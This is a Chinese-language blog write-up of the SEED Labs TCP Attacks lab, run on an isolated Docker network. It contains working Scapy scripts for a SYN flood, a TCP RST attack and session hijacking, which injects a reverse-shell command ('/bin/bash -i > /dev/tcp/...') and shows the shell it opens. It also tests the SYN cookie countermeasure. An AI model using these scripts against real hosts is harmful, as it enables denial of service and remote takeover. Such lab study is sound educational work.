---
layout: post
title:  "TCP Attacks"
date:   2022-10-05 00:00:00 +0800
categories: 实验
tags: seedlab tcp
comments: 1
mathjax: true
copyrights: 原创
---

本文为 [SEED Labs 2.0 - TCP Attacks Lab](https://seedsecuritylabs.org/Labs_20.04/Networking/TCP_Attacks/) 的实验记录。

## 实验原理

TCP/IP 协议中的漏洞代表了协议设计和实现中一种特殊类型的漏洞；它们提供了宝贵的教训，说明为什么应该从一开始就设计安全性，而不是事后才添加。此外，研究这些漏洞有助于我们了解网络安全的挑战以及为什么需要许多网络安全措施。在本实验中，我们将对 TCP 进行多次攻击。本实验涵盖以下主题：

- TCP 协议
- TCP SYN 泛洪攻击和 SYN cookie
- TCP 重置攻击
- TCP 会话劫持攻击
- shell 反弹

## Task 1: SYN Flooding Attack

![image-20220829142851336](./assets/tcp1.png)

为方便观察，我们修改名称：

```shell
# export PS1="\w victim-10.9.0.5$ "
```

```shell
# export PS1="\w attacker-10.9.0.1$ "
```

```shell
# export PS1="\w user1-10.9.0.6$ "
```

修改 dockerfile，给 victim 加上：

```dockerfile
privileged: true
```

### Task 1.1: Launching the Attack Using Python

编写 `synflood.py`：

```python
#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags='S')
pkt = ip/tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32))) # source iP
    pkt[TCP].sport = getrandbits(16) # source port
    pkt[TCP].seq = getrandbits(32) # sequence number
    send(pkt, verbose = 0)
```

查看当前 tcp 连接：

```shell
victim-10.9.0.5$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.11:41019        0.0.0.0:*               LISTEN
```

运行程序：

```shell
attacker-10.9.0.1$ synflood.py
```

查看当前 tcp 连接：

```shell
victim-10.9.0.5$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.11:41019        0.0.0.0:*               LISTEN     
tcp        0      0 10.9.0.5:23             51.28.29.181:52204      SYN_RECV   
tcp        0      0 10.9.0.5:23             144.159.54.170:59931    SYN_RECV   
tcp        0      0 10.9.0.5:23             187.91.156.41:61074     SYN_RECV   
......
victim-10.9.0.5$ netstat -tna | grep SYN_RECV | wc -l
97
victim-10.9.0.5$ ss -n state syn-recv sport = :23 | wc -l
98
```

我们 telnet `10.9.0.5`：

```shell
user1-10.9.0.6$ telnet 10.9.0.5
Trying 10.9.0.5...
Connected to 10.9.0.5.
Escape character is '^]'.
Ubuntu 20.04.1 LTS
791656960e97 login: seed
Password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-54-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Aug 29 06:36:20 UTC 2022 from user1-10.9.0.6.net-10.9.0.0 on pts/2
```

只稍微等了一下下，就连接上了。而我们之后再次连接，都是瞬间连接上。

第一次是因为，python 程序跑得不够快，其它用户总有机会抢过它。而之后能立即连接是因为，受害者主机记住了原来的连接。

### Task 1.2: Launch the Attack Using C

我们首先清空一下：

```shell
victim-10.9.0.5$ ip tcp_metrics flush
```

在宿主机编译：

```shell
gcc -o synflood synflood.c
chmod a+x synflood
```

然后运行：

```shell
attacker-10.9.0.1$ synflood 10.9.0.5 23
```

查看当前 tcp 连接：

```shell
victim-10.9.0.5$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.11:41019        0.0.0.0:*               LISTEN     
tcp        0      0 10.9.0.5:23             111.55.219.82:27483     SYN_RECV   
tcp        0      0 10.9.0.5:23             249.195.34.103:34881    SYN_RECV   
tcp        0      0 10.9.0.5:23             148.11.56.119:17200     SYN_RECV   
......
victim-10.9.0.5$ netstat -tna | grep SYN_RECV | wc -l
97
victim-10.9.0.5$ ss -n state syn-recv sport = :23 | wc -l
98
```

telnet `10.9.0.5`：

```shell
user1-10.9.0.6$ telnet 10.9.0.5
Trying 10.9.0.5...
```

可以看到，卡在这里不动了。

### Task 1.3: Enable the SYN Cookie Countermeasure

我们首先清空一下：

```shell
victim-10.9.0.5$ ip tcp_metrics flush
```

启动 syncookies：

```shell
victim-10.9.0.5$ sysctl -w net.ipv4.tcp_syncookies=1
net.ipv4.tcp_syncookies = 1
```

启动程序：

```shell
attacker-10.9.0.1$ synflood 10.9.0.5 23
```

查看当前 tcp 连接：

```shell
victim-10.9.0.5$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.11:34637        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
tcp        0      0 10.9.0.5:23             55.22.243.45:18447      SYN_RECV   
tcp        0      0 10.9.0.5:23             118.13.9.120:28741      SYN_RECV   
tcp        0      0 10.9.0.5:23             32.34.55.0:57543        SYN_RECV   
......
victim-10.9.0.5$ netstat -tna | grep SYN_RECV | wc -l
128
victim-10.9.0.5$ ss -n state syn-recv sport = :23 | wc -l
129
```

telnet `10.9.0.5`：

```shell
user1-10.9.0.6$ telnet 10.9.0.5
Trying 10.9.0.5...
Connected to 10.9.0.5.
Escape character is '^]'.
Ubuntu 20.04.1 LTS
22c45e0a11e6 login: seed
Password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-54-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

可以看到，尽管队列已经满了，但还是能正常连接。

## Task 2: TCP RST Attacks on telnet Connections

在宿主机中查看网桥名称：

```shell
$ ifconfig
br-88413f1d34bf: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.9.0.1  netmask 255.255.255.0  broadcast 10.9.0.255
        inet6 fe80::42:65ff:fef4:634e  prefixlen 64  scopeid 0x20<link>
        ether 02:42:65:f4:63:4e  txqueuelen 0  (Ethernet)
        RX packets 4395661  bytes 193408492 (193.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4821393  bytes 260362284 (260.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

编写 `tcprst.py`：

```python
#!/usr/bin/env python3
from scapy.all import *

def spoof_pkt(pkt):
    ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
    tcp = TCP(sport=23, dport=pkt[TCP].dport, flags="R", seq=pkt[TCP].seq+1)
    pkt = ip/tcp
    ls(pkt)
    send(pkt, verbose=0)

f = f'tcp and src host 10.9.0.5'
pkt = sniff(iface='br-88413f1d34bf', filter=f, prn=spoof_pkt)
```

运行程序：

```shell
attacker-10.9.0.1$ tcprst.py
```

telnet `10.9.0.5`：

```shell
user1-10.9.0.6$ telnet 10.9.0.5
Trying 10.9.0.5...
Connected to 10.9.0.5.
Escape character is '^]'.
Ubuntu 20.04.1 LTS
22c45e0a11e6 login: sConnection closed by foreign host.
```

可以看出，连接直接被中断了。

## Task 3: TCP Session Hijacking

编写 `tcphijacking.py`：

```python
#!/usr/bin/env python3
from scapy.all import *

def spoof_pkt(pkt):
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    tcp = TCP(sport=pkt[TCP].dport, dport=23,
              flags="A",
              seq=pkt[TCP].ack, ack=pkt[TCP].seq+1)
    data = "echo \"Fk U bitch!\" >> ~/hijacking.out\n\0"
    pkt = ip/tcp/data
    ls(pkt)
    send(pkt, verbose=0)

f = f'tcp and src host 10.9.0.5'
pkt = sniff(iface='br-88413f1d34bf', filter=f, prn=spoof_pkt)
```

telnet `10.9.0.5`：

```shell
user1-10.9.0.6$ telnet 10.9.0.5
Trying 10.9.0.5...
Connected to 10.9.0.5.
Escape character is '^]'.
Ubuntu 20.04.1 LTS
22c45e0a11e6 login: seed
Password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-54-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Aug 29 10:20:40 UTC 2022 from user1-10.9.0.6.net-10.9.0.0 on pts/2
```

运行程序：

```shell
attacker-10.9.0.1$ tcphijacking.py
```

查看攻击效果：

```shell
victim-10.9.0.5$ cat /home/seed/hijacking.out
Fk U bitch!
```

可以看出，程序成功写入了一个文件。

## Task 4: Creating Reverse Shell using TCP Session Hijacking

编写 `reverseshell.py`：

```python
#!/usr/bin/env python3
from scapy.all import *

def spoof_pkt(pkt):
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    tcp = TCP(sport=pkt[TCP].dport, dport=23, flags="A", seq=pkt[TCP].ack, ack=pkt[TCP].seq+1)
    data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\n\0"
    pkt = ip/tcp/data
    send(pkt, verbose=0)
    
f = f'tcp and src host 10.9.0.5'
pkt = sniff(iface='br-88413f1d34bf', filter=f, prn=spoof_pkt)
```

在 attacker 上开启监听：

```shell
attacker-10.9.0.1$ nc -lnv 9090
Listening on 0.0.0.0 9090
```

telnet `10.9.0.5`：

```shell
user1-10.9.0.6$ telnet 10.9.0.5
Trying 10.9.0.5...
Connected to 10.9.0.5.
Escape character is '^]'.
Ubuntu 20.04.1 LTS
22c45e0a11e6 login: seed
Password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-54-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Aug 29 10:54:18 UTC 2022 from user1-10.9.0.6.net-10.9.0.0 on pts/3
```

运行程序：

```shell
attacker-10.9.0.1$ reverseshell.py
```

可以看到，成功拿到 victim 的 shell：

```shell
attacker-10.9.0.1$ nc -lnv 9090
Listening on 0.0.0.0 9090
Connection received on 10.9.0.5 42462
seed@22c45e0a11e6:~$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
70: eth0@if71: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:09:00:05 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.9.0.5/24 brd 10.9.0.255 scope global eth0
       valid_lft forever preferred_lft forever
```

## 实验总结

本实验需要分清到底劫持的哪个报文，剩下的工作就很简单了。
